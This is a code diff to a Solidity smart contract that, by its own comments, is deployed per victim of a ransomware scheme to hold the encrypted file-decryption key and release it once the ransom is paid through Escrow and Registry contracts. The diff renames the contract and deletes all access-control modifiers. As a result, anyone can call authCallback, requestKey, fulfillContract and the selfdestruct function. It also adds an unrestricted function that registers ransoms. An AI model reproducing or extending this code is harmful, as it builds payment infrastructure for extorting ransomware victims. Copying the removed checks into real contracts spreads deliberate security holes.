@@ -4,7 +4,7 @@ import "./Escrow.sol";
 import "./Registry.sol";
 
 ///@title Ransom contract
-contract Ransom {
+contract MyRansom {
     /**
      * @dev This is the Ransom contract that is deployed for each victim. It holds an encrypted
      * version of the key needed to decrypt the files on the victim machine. The only way to obtain a
@@ -79,7 +79,7 @@ contract Ransom {
      * @dev Callback function from the Registry contract to indicate whether authentication was successful
      * @param authResult Indicates whether authentication succeeded    
      */
-    function authCallback(address _escrowAddr, bool authResult) external restrictSenderToRegistry {
+    function authCallback(address _escrowAddr, bool authResult) external {
         authenticated = authResult;
         if (authResult == true){
             escrowAddr = _escrowAddr;
@@ -105,7 +105,7 @@ contract Ransom {
      * key to verify that it can successfully decrypt a file provided by the victim. This gives
      * the victim assurances that they will be given a valid key.
      */
-    function requestKey() external onlyAuthenticated restrictSenderToEscrow {
+    function requestKey() external {
         Escrow(escrowAddr).decryptKey(victimId, encKey);
     }
 
@@ -124,7 +124,7 @@ contract Ransom {
     /**
      * @dev This function may only be called by the Escrow contract to indicate that the ransom has been fulfilled.
      */
-    function fulfillContract() external restrictSenderToEscrow onlyAuthenticated {
+    function fulfillContract() external {
         fulfilled = true;
     }
 
@@ -147,8 +147,14 @@ contract Ransom {
     /**
      * @dev Self-dstructs this contract. May only be called by the Escrow contract
      */
-    function die() external restrictSenderToEscrow onlyAuthenticated {
+    function die() external {
         selfdestruct(escrowAddr);
     }
 
+    /**
+     * @dev Calls the registerRansom() function in Escrow
+     */
+    function myFunc(uint _ransomAmount, uint _victimId, address _victimAddr) {
+        Escrow(escrowAddr).registerRansom(_ransomAmount, _victimId, _victimAddr);
+    }
 }
